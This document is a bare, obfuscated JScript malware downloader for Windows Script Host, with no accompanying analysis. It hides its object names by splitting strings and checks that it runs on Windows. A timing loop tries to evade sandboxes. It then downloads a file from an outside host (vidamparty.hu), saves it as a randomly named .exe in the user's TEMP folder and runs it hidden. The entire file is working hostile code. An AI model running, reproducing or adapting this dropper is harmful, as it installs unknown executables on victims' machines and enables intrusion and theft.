var V1 = false;
var TO = "Create"+"Object";
var ZQ = function U() {return WScript[TO]("WScript"+".Shell");}(), XD = 11;
var X = "MSXML2"+".XMLHTTP";
var KW = 2;
var C = KW - 2;
function F(V){ZQ["Run"](V, C, C);};
function O(){return X + "";};
function G(C0, OY){C = C * 1; return C0 - OY;};
function LO(){return TO;};
/*@cc_on
  @if (@_win32 || @_win64)
    V1 = true;
  @end
@*/
if (V1)
{
var U0 = "";
function D(){return 22;};
var CF = 0; var JI = 0;
function SM()
{
var CG = new this["Date"]();
var SA = CG["getUTCMilliseconds"]();
WScript["Sleep"](D());
var CG = new this["Date"]();
var FW = CG["getUTCMilliseconds"]();
WScript["Sleep"](D());
var CG = new this["Date"]();
var D1 = CG["getUTCMilliseconds"]();
var CF = "XA";
CF = G(FW, SA);
var JI = "DU";
JI = G(D1, FW);
U0 = "open";
return G(CF, JI);
}
var V0 = false;
var Z = false;
for (var M = C; M < D() * 1; M++){if (SM() != C){
V0 = true; 
JI = "31" + 11 * CF + JI; 
Z = true; 
break;
}}
function E() {return ((V0 == true) && (V0 == Z)) ? 1 : C;};
if (V0 && E() && Z){
function ZX() {return ZQ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "JexP1lsls8bNrgO.ex" + "e";};
 E2 = O();
 E1 = WScript[TO](E2);
 var D0 = 1;
do { 
	for (;D0;){
	try {
		if (D0 == 1)
		{
			E1[U0]("GET", "http://vidamparty.hu/as0ldr", false);
			E1["send"]();
			L = "Sleep";
			D0 = 2;
		}
		WScript[L](D() + 120); 
		if (E1["readystate"] < 2 * 2) continue;
		D0 = C;
		function LP(E0) {var I = (1, 2, 3, 4, 5, E0); return I;};
		TA = WScript[LO()]("ADODB.Stream");
		E2 = TA;
		E2[U0]();
		E2["type"] = LP(1);
		E2["write"](E1["ResponseBody"]);
		TA["position"] = LP(C);
		E2["Save" + "ToFile"](ZX(), 2);
		TA["cl"+"ose"]();
		UT = ZX();
		F(UT);
	} catch(F0){};};
}while (D0);
}
}

